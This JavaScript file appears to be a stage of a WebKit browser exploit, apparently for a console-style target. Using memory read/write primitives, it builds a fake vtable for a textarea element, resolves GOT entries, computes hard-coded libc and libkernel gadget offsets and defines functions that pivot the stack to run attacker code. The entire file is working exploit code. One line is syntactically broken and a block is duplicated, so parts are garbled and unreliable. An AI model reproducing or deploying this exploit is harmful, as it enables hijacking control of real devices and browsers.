var tarea = document.createElement("textarea"); // Create a textarea element
var real_vt_ptr = read_ptr_at(addrof(tarea) + 0x18); // Get the real vtable pointer of the textarea element
var fake_vt_ptr = malloc(0x400); // Allocate memory for fake vtable pointer
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400)); // Copy the contents of the real vtable to the fake vtable
var real_vtable = read_ptr_at(fake_vt_ptr); // Get the real vtable address
var fake_vtable = malloc(0x2000); // Allocate memory for fake vtable
write_mem(fake_vtable, read_mem(real_vtable, 0x2000)); // Copy the contents of the real vtable to the fake vtable
write_ptr_at(fake_vt_ptr, fake_vtable); // Overwrite the fake vtable pointer in fake vtable
var fake_vt_ptr_bak = malloc(0x400); // Allocate memory for backup of fake vtable pointer
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400)); // Copy the contents of the fake vtable pointer to the backup
var plt_ptr = read_ptr_at(fake_vtable) - 10063176; // Calculate the plt pointer

// Get the address from GOT table at the specified index
function get_got_addr(index) {
  let _ptr = plt_ptr + index * 16;
  let _val = read_mem(_ptr, 6);

  if (_val[0] != 0xff || _val[1] != 0x25)
      throw "invalid GOT entry";

  var offset = 0;
  for (let i = 5; i >= 2; i--) {
    offset *= 256;
    offset += _val[i];
  }
  offset += _ptr + 6;
  return read_ptr_at(offset);
}

var webkit_base = read_ptr_at(fake_vtable);
var libkernel_base = get_got_addr(705) - 0x10000;
var libc_base = get_got_addr(582);

var saveall_addr = libc_base + 0x2e2c8;
var loadall_addr = libc_base + 0x3275c;
var setjmp_addr = libc_base + 0xbfae0;
var longjmp_addr = libc_base + 0xbfb30;
var pivot_addr = libc_base + 0x327d2;
var infloop_addr = libc_base + 0x447a0;
var jop_frame_addr = libc_base + 0x715d0;
var get_errno_addr_addr = libkernel_base + 0x9ff0;
var pthread_create_addr = libkernel_base + 0xf980;

function saveall() {
  var ans = malloc(0x800);
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
  write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
  tarea.scrollLeft = 0;
  write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
  write_mem(ans, read_mem(fake_vt_ptr, 0x400));
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
  write_ptr_at(fake_vt_ptr + 0x38, 0x1234);
  write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
  tarea.scrollLeft = 0;
  write_ptr_ataddroftarea + 0x18, real_vt_ptr;
  write_mem(ans + 0x400, read_mem(fake_vt_ptr, 0x400));
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
  return ans;
}
function pivot(buf) {
  var ans = malloc(0x400);
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
  write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
  tarea.scrollLeft = 0;
  write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
  write_mem(ans, read_mem(fake_vt_ptr, 0x400));
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, pivot_addr);
  write_ptr_at(fake_vt_ptr + 0x38, buf);
  write_ptr_at(ans + 0x38, read_ptr_at(ans + 0x38) - 16);
  write_ptr_at(buf, ans);
  write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
  tarea.scrollLeft = 0;
  write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
}
